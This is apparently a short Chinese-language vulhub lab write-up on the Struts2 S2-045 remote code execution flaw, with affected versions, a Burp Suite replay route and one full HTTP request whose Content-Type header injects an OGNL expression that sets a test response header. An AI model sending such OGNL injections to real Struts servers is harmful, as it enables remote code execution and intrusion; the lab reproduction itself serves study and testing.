# Struts2_045_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行

### 0x01漏洞介绍

​			在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令

​			影响版本

  		2.3.5 - 2.3.31  2.5 - 2.5.10 

### 0x02漏洞复现

#### payload1(RCE)：

POST / HTTP/1.1 Host: localhost:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.8,es;q=0.6 Connection: close Content-Length: 0 Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data



​			**登录界面**

![S2_045_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_045_rce_1.jpg)

​			**Burpsuite改包重放，有回显，发现OGNL表达式被执行**

![S2_045_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_045_rce_2.jpg)

​			**利用Struts2漏洞检查工具**

![S2_045_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_045_rce_3.jpg)



### 0x03参考资料

https://blog.csdn.net/isinstance/article/details/61193987
